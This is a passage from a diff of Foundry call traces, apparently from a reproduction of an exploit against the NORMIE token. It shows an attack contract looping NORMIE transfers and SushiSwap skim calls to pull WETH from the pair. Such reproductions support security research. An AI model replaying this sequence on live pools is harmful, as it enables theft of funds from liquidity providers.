     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
+    │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000158791ece940465 → 0x0000000000000000000000000000000000000000000000000160869b5540ba34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
@@ -2004,8 +1912,8 @@ Traces:
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000160869b5540ba34 → 0x0000000000000000000000000000000000000000000000000158791ece940465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000767c01019b435 → 0x000000000000000000000000000000000000000000000000000f753c96c66a04
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000160869b5540ba34 → 0x0000000000000000000000000000000000000000000000000158791ece940465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2013,8 +1921,8 @@ Traces:
     │   │   │   ├─ emit stepLiquify(: false, : true, : true, : true)
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000158791ece940465 → 0x0000000000000000000000000000000000000000000000000160869b5540ba34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000158791ece940465 → 0x0000000000000000000000000000000000000000000000000160869b5540ba34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -2029,9 +1937,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000160869b5540ba34 → 0x0000000000000000000000000000000000000000000000000158791ece940465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f753c96c66a04 → 0x000000000000000000000000000000000000000000000000001782b91d731fd3
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000160869b5540ba34 → 0x0000000000000000000000000000000000000000000000000158791ece940465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2046,8 +1954,8 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001782b91d731fd3 → 0x00000000000000000000000000000000000000000000000000075885afb8bfd3
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
+    │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001782b91d731fd3 → 0x00000000000000000000000000000000000000000000000000075885afb8bfd3
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000158791ece940465 → 0x0000000000000000000000000000000000000000000000000168a3523c4e6465
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
@@ -2058,8 +1966,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 1224066353287043201 [1.224e18])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 1224066353287043201 [1.224e18])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000017c13b0a24209fd11 → 0x0000000000000000000000000000000000000000000000016b16eec558db6490
     │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x00000000000000000000000000000000000000000000000010fcc1dce92e9881
+    │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000017c13b0a24209fd11 → 0x0000000000000000000000000000000000000000000000016b16eec558db6490
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 26163361616622216336 [2.616e19]
@@ -2091,9 +1999,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000168a3523c4e6465 → 0x0000000000000000000000000000000000000000000000000170b0cec2fb1a34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -2109,8 +2017,8 @@ Traces:
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000075885afb8bfd3 → 0x000000000000000000000000000000000000000000000000000f6602366575a2
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000170b0cec2fb1a34 → 0x0000000000000000000000000000000000000000000000000168a3523c4e6465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000170b0cec2fb1a34 → 0x0000000000000000000000000000000000000000000000000168a3523c4e6465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2135,8 +2043,8 @@ Traces:
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000170b0cec2fb1a34 → 0x0000000000000000000000000000000000000000000000000168a3523c4e6465
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f6602366575a2 → 0x0000000000000000000000000000000000000000000000000017737ebd122b71
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f6602366575a2 → 0x0000000000000000000000000000000000000000000000000017737ebd122b71
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2151,9 +2059,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000017737ebd122b71 → 0x0000000000000000000000000000000000000000000000000007494b4f57cb71
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000168a3523c4e6465 → 0x0000000000000000000000000000000000000000000000000178cd85aa08c465
+    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 26163361616622216336 [2.616e19], 101510565210252389 [1.015e17], 1716694911 [1.716e9]
@@ -2163,8 +2071,8 @@ Traces:
     │   │   │   │   │   ├─ [22901] WETH::transfer(SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], 1119185458947606109 [1.119e18])
     │   │   │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 1119185458947606109 [1.119e18])
     │   │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000000f88253ec65ac65d
     │   │   │   │   │   │   │   @ 0xfdf5227b1487be35dc63aab006c1a41e45e86b4b570aba92f1d1bb5aed6ed234: 0x0000000000000000000000000000000000000000000000016b16eec558db6490 → 0x0000000000000000000000000000000000000000000000015b8ec98692809e33
+    │   │   │   │   │   │   │   @ 0xb7f00540c39cd87ef3e4b07d856896278fdba0ce5372ab66c55f72b6297e8a10: 0 → 0x0000000000000000000000000000000000000000000000000f88253ec65ac65d
     │   │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
     │   │   │   │   │   │   └─ ← [Return] 25044176157674610227 [2.504e19]
@@ -2196,9 +2104,9 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000178cd85aa08c465 → 0x0000000000000000000000000000000000000000000000000180db0230b57a34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000178cd85aa08c465 → 0x0000000000000000000000000000000000000000000000000180db0230b57a34
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
     │   │   │   ├─ [457] WETH::balanceOf(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f]) [staticcall]
@@ -2214,8 +2122,8 @@ Traces:
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007494b4f57cb71 → 0x000000000000000000000000000000000000000000000000000f56c7d6048140
     │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000180db0230b57a34 → 0x0000000000000000000000000000000000000000000000000178cd85aa08c465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x0000000000000000000000000000000000000000000000000007494b4f57cb71 → 0x000000000000000000000000000000000000000000000000000f56c7d6048140
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2239,9 +2147,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000180db0230b57a34 → 0x0000000000000000000000000000000000000000000000000178cd85aa08c465
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f56c7d6048140 → 0x000000000000000000000000000000000000000000000000001764445cb1370f
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000180db0230b57a34 → 0x0000000000000000000000000000000000000000000000000178cd85aa08c465
+    │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2256,9 +2164,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000178cd85aa08c465 → 0x0000000000000000000000000000000000000000000000000188f7b917c32465
     │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000001764445cb1370f → 0x00000000000000000000000000000000000000000000000000073a10eef6d70f
-    │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000178cd85aa08c465 → 0x0000000000000000000000000000000000000000000000000188f7b917c32465
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 25044176157674610227 [2.504e19], 106060565210252389 [1.06e17], 1716694911 [1.716e9]
@@ -2301,8 +2209,8 @@ Traces:
     │   │   │   │   └─ ← [Stop]
     │   │   │   ├─ emit Transfer(from: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 2266628300256719 [2.266e15])
     │   │   │   ├─  storage changes:
-    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000188f7b917c32465 → 0x000000000000000000000000000000000000000000000000019105359e6fda34
     │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf → 0
+    │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000188f7b917c32465 → 0x000000000000000000000000000000000000000000000000019105359e6fda34
     │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0 → 0x00000000000000000000000000000000000000000000000000102a336dba6000
     │   │   │   └─ ← [Return] true
     │   │   ├─ [45039] SushiV2Pair::skim(Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
@@ -2318,9 +2226,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000073a10eef6d70f → 0x000000000000000000000000000000000000000000000000000f478d75a38cde
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000019105359e6fda34 → 0x0000000000000000000000000000000000000000000000000188f7b917c32465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000019105359e6fda34 → 0x0000000000000000000000000000000000000000000000000188f7b917c32465
+    │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000073a10eef6d70f → 0x000000000000000000000000000000000000000000000000000f478d75a38cde
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [12931] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2344,9 +2252,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000019105359e6fda34 → 0x0000000000000000000000000000000000000000000000000188f7b917c32465
     │   │   │   │   │   @ 0x5223e63f0507f82c7e25e324cdfe3030bae704b36135ec7694b55330a3b5b731: 0 → 0x00000000000000000000000000000000000000000000000000080d7c86acb5cf
     │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x000000000000000000000000000000000000000000000000000f478d75a38cde → 0x00000000000000000000000000000000000000000000000000175509fc5042ad
+    │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x000000000000000000000000000000000000000000000000019105359e6fda34 → 0x0000000000000000000000000000000000000000000000000188f7b917c32465
     │   │   │   │   └─ ← [Return] true
     │   │   │   └─ ← [Stop]
     │   │   ├─ [109078] NORMIE::transfer(SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], 2266628300256719 [2.266e15])
@@ -2361,9 +2269,9 @@ Traces:
     │   │   │   │   │   ├─ emit Transfer(from: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], to: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], value: 4550000000000000 [4.55e15])
     │   │   │   │   │   ├─ emit Approval(owner: NORMIE: [0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200], spender: SushiRouterv2: [0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891], value: 0)
     │   │   │   │   │   ├─  storage changes:
-    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   │   @ 0x1d3cf07d3cb3ceffbb035947d90ac27fa941b823a97da0710eb970f0693c7b43: 0x00000000000000000000000000000000000000000000000000175509fc5042ad → 0x00000000000000000000000000000000000000000000000000072ad68e95e2ad
     │   │   │   │   │   │   @ 0x44a7c863a94ced30d2285c7f1d19c1ad5a1bd3cd9783989364fc8cbbb62cea1a: 0x0000000000000000000000000000000000000000000000000188f7b917c32465 → 0x000000000000000000000000000000000000000000000000019921ec857d8465
+    │   │   │   │   │   │   @ 0x4f8e73b8a1533d3886ca4bbc3edb63bf3610458ad27e93e2b8290bcb666c815b: 0x00000000000000000000000000000000000000000000000000102a336dba6000 → 0
     │   │   │   │   │   └─ ← [Return] true
     │   │   │   │   ├─ [517] SushiV2Pair::getReserves() [staticcall]
     │   │   │   │   │   └─ ← [Return] 24016940015537296857 [2.401e19], 110610565210252389 [1.106e17], 1716694911 [1.716e9]
@@ -2423,9 +2331,9 @@ Traces:
     │   │   │   │   ├─ emit stepLiquify(: false, : true, : false, : true)
     │   │   │   │   ├─ emit Transfer(from: SushiV2Pair: [0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f], to: Attack Contract: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 2266628300256719 [2.266e15])
     │   │   │   │   ├─  storage changes:
